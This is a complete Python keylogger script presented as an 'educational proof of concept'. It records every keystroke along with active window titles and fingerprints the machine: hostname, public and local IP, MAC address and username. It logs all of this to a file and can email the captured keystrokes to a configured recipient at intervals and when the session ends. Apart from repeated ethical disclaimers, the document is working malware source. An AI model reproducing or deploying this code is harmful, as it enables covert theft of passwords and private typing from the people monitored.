#!/usr/bin/env python3
"""
👁️ Educational Keylogger Proof of Concept

⚠️  ETHICAL WARNING: This tool is for EDUCATIONAL PURPOSES ONLY.
    - Use only on systems you own or have explicit permission to test
    - Always disclose monitoring activities
    - Never use for malicious purposes
    - Check local laws regarding keyloggers

Features: Keystroke logging, active window tracking, system fingerprinting, email reporting
"""

import os
import sys
import time
import json
import socket
import platform
import threading
from datetime import datetime
from typing import Optional, Dict, Any

# Core dependencies
try:
    from pynput import keyboard
    import getmac
    import requests
except ImportError as e:
    print(f"[!] Missing dependency: {e}")
    print("[!] Install with: pip install pynput getmac requests")
    sys.exit(1)

# Platform-specific imports
try:
    if platform.system() == "Windows":
        import win32gui
        HAS_WIN32 = True
    else:
        HAS_WIN32 = False
except ImportError:
    HAS_WIN32 = False
    print("[!] win32gui not available - window title tracking disabled")

# Email imports (optional)
try:
    import smtplib
    from email.mime.text import MIMEText
    from email.mime.multipart import MIMEMultipart
    HAS_EMAIL = True
except ImportError:
    HAS_EMAIL = False
    print("[!] smtplib not available - email reporting disabled")

class EducationalKeylogger:
    def __init__(self, log_file: str = "keyfile.txt", email_config: Optional[Dict] = None):
        self.log_file = log_file
        self.email_config = email_config
        self.current_window = ""
        self.keystroke_buffer = []
        self.session_start = datetime.now()
        self.system_info = self._get_system_info()
        
        # Initialize log file with session header
        self._initialize_log()
    
    def _get_system_info(self) -> Dict[str, Any]:
        """Collect system fingerprinting information"""
        try:
            # Get public IP
            try:
                public_ip = requests.get('https://api.ipify.org?format=json', timeout=5).json().get('ip', 'Unknown')
            except:
                public_ip = 'Unknown'
            
            # Get local IP
            try:
                local_ip = socket.gethostbyname(socket.gethostname())
            except:
                local_ip = 'Unknown'
            
            # Get MAC address
            try:
                mac_address = getmac.get_mac_address()
            except:
                mac_address = 'Unknown'
            
            return {
                'timestamp': datetime.now().isoformat(),
                'hostname': socket.gethostname(),
                'platform': platform.platform(),
                'os_version': platform.system() + ' ' + platform.release(),
                'architecture': platform.architecture()[0],
                'processor': platform.processor(),
                'public_ip': public_ip,
                'local_ip': local_ip,
                'mac_address': mac_address,
                'user': os.getenv('USER', os.getenv('USERNAME', 'Unknown'))
            }
        except Exception as e:
            return {'error': f'Failed to get system info: {str(e)}'}
    
    def _get_active_window(self) -> str:
        """Get the title of the currently active window"""
        if not HAS_WIN32:
            return "Unknown (win32gui not available)"
        
        try:
            window_title = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            return window_title or "No Title"
        except:
            return "Unknown"
    
    def _initialize_log(self):
        """Initialize log file with session information"""
        with open(self.log_file, 'a', encoding='utf-8') as f:
            f.write("\n" + "="*80 + "\n")
            f.write(f"👁️ EDUCATIONAL KEYLOGGER SESSION STARTED\n")
            f.write(f"⏰ Timestamp: {self.session_start.isoformat()}\n")
            f.write(f"🖥️ System: {self.system_info.get('platform', 'Unknown')}\n")
            f.write(f"🌐 Public IP: {self.system_info.get('public_ip', 'Unknown')}\n")
            f.write(f"🏠 Local IP: {self.system_info.get('local_ip', 'Unknown')}\n")
            f.write(f"🔗 MAC: {self.system_info.get('mac_address', 'Unknown')}\n")
            f.write(f"👤 User: {self.system_info.get('user', 'Unknown')}\n")
            f.write("="*80 + "\n\n")
    
    def _log_keystroke(self, key_data: Dict):
        """Log keystroke with context"""
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        with open(self.log_file, 'a', encoding='utf-8') as f:
            # Check if window changed
            if key_data['window'] != self.current_window:
                self.current_window = key_data['window']
                f.write(f"\n🪟 Window: [{self.current_window}] at {timestamp}\n")
            
            # Log the keystroke
            if key_data['key_type'] == 'char':
                f.write(key_data['key'])
            else:
                f.write(f"[{key_data['key']}]")
            
            f.flush()  # Ensure immediate write
    
    def _on_key_press(self, key):
        """Handle key press events"""
        try:
            # Get current window
            current_window = self._get_active_window()
            
            # Process key
            if hasattr(key, 'char') and key.char is not None:
                key_data = {
                    'timestamp': datetime.now().isoformat(),
                    'key': key.char,
                    'key_type': 'char',
                    'window': current_window
                }
            else:
                # Special keys
                key_str = str(key).replace('Key.', '')
                key_mapping = {
                    'space': ' ',
                    'enter': '\n',
                    'tab': '\t',
                    'backspace': '[BACKSPACE]',
                    'delete': '[DELETE]',
                    'esc': '[ESC]',
                    'shift': '[SHIFT]',
                    'ctrl': '[CTRL]',
                    'alt': '[ALT]',
                    'cmd': '[CMD]',
                    'caps_lock': '[CAPS]',
                    'up': '[UP]',
                    'down': '[DOWN]',
                    'left': '[LEFT]',
                    'right': '[RIGHT]'
                }
                
                key_data = {
                    'timestamp': datetime.now().isoformat(),
                    'key': key_mapping.get(key_str.lower(), f'[{key_str.upper()}]'),
                    'key_type': 'special',
                    'window': current_window
                }
            
            # Log the keystroke
            self._log_keystroke(key_data)
            
            # Add to buffer for periodic email
            self.keystroke_buffer.append(key_data)
            
        except Exception as e:
            print(f"[!] Error logging keystroke: {e}")
    
    def _send_email_report(self, subject: str, body: str):
        """Send email report (if configured)"""
        if not HAS_EMAIL or not self.email_config:
            return False
        
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email_config['sender']
            msg['To'] = self.email_config['recipient']
            msg['Subject'] = subject
            
            msg.attach(MIMEText(body, 'plain'))
            
            server = smtplib.SMTP(self.email_config['smtp_server'], self.email_config['smtp_port'])
            
            if self.email_config.get('use_tls'):
                server.starttls()
            
            if self.email_config.get('password'):
                server.login(self.email_config['sender'], self.email_config['password'])
            
            server.send_message(msg)
            server.quit()
            return True
            
        except Exception as e:
            print(f"[!] Email failed: {e}")
            return False
    
    def _periodic_report(self, interval_minutes: int = 30):
        """Send periodic email reports"""
        if not HAS_EMAIL or not self.email_config:
            return
        
        while True:
            time.sleep(interval_minutes * 60)
            
            if self.keystroke_buffer:
                # Create report
                report_body = f"""
👁️ Educational Keylogger Report
⏰ Generated: {datetime.now().isoformat()}
🖥️ System: {self.system_info.get('hostname', 'Unknown')}
🌐 IP: {self.system_info.get('public_ip', 'Unknown')}

Recent Activity ({len(self.keystroke_buffer)} keystrokes):
{''.join([k['key'] if k['key_type'] == 'char' else k['key'] for k in self.keystroke_buffer[-50:]])}

---
⚠️ This is an educational monitoring tool
"""
                
                self._send_email_report(f"Keylogger Report - {self.system_info.get('hostname')}", report_body)
                self.keystroke_buffer.clear()
    
    def start_monitoring(self, email_interval_minutes: int = 30):
        """Start the keylogger monitoring"""
        print(f"👁️ Educational Keylogger Started")
        print(f"📁 Log file: {os.path.abspath(self.log_file)}")
        print(f"⏰ Started at: {self.session_start.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"🖥️ System: {self.system_info.get('hostname', 'Unknown')}")
        print(f"🌐 Public IP: {self.system_info.get('public_ip', 'Unknown')}")
        
        if HAS_EMAIL and self.email_config:
            print(f"📧 Email reports enabled (every {email_interval_minutes} minutes)")
            
            # Start email reporting thread
            email_thread = threading.Thread(
                target=self._periodic_report,
                args=(email_interval_minutes,),
                daemon=True
            )
            email_thread.start()
        
        print("\n⚠️  ETHICAL REMINDER:")
        print("   • Use only on systems you own or have permission to test")
        print("   • Always disclose monitoring activities")
        print("   • Press Ctrl+C to stop monitoring\n")
        
        try:
            # Start keyboard listener
            with keyboard.Listener(on_press=self._on_key_press) as listener:
                listener.join()
        except KeyboardInterrupt:
            print(f"\n[!] Monitoring stopped by user at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Send final report
            if HAS_EMAIL and self.email_config:
                final_report = f"""
👁️ Final Keylogger Report
⏰ Ended: {datetime.now().isoformat()}
🖥️ System: {self.system_info.get('hostname', 'Unknown')}
📊 Session duration: {datetime.now() - self.session_start}

Total keystrokes logged: {len(self.keystroke_buffer)}

---
⚠️ This was an educational monitoring session
"""
                self._send_email_report(f"Final Keylogger Report - {self.system_info.get('hostname')}", final_report)

def main():
    """Main entry point with configuration"""
    print("👁️ Educational Keylogger - Proof of Concept")
    print("="*50)
    
    # Email configuration (optional)
    email_config = None
    
    # Example email configuration (modify as needed)
    # email_config = {
    #     'sender': 'your_email@gmail.com',
    #     'recipient': 'your_email@gmail.com', 
    #     'smtp_server': 'smtp.gmail.com',
    #     'smtp_port': 587,
    #     'use_tls': True,
    #     'password': 'your_app_password'  # Use app password for Gmail
    # }
    
    if len(sys.argv) > 1 and sys.argv[1] == '--help':
        print("""
Usage: python keylogger.py [options]

Options:
  --help              Show this help message
  --email             Enable email reporting (requires config)
  --interval N        Email report interval in minutes (default: 30)
  
Example:
  python keylogger.py
  python keylogger.py --email --interval 15

⚠️  ETHICAL WARNING:
  This tool is for EDUCATIONAL PURPOSES ONLY.
  Use only on systems you own or have explicit permission.
  Always disclose monitoring activities.
""")
        return
    
    # Parse command line arguments
    email_enabled = '--email' in sys.argv
    interval = 30
    
    for i, arg in enumerate(sys.argv):
        if arg == '--interval' and i + 1 < len(sys.argv):
            try:
                interval = int(sys.argv[i + 1])
            except ValueError:
                print("[!] Invalid interval value")
                return
    
    if email_enabled and not email_config:
        print("[!] Email reporting requested but not configured")
        print("[!] Edit the script to add email configuration")
        email_enabled = False
    
    # Create and start keylogger
    keylogger = EducationalKeylogger(
        log_file="keyfile.txt",
        email_config=email_config if email_enabled else None
    )
    
    keylogger.start_monitoring(email_interval_minutes=interval)

if __name__ == "__main__":
    main()
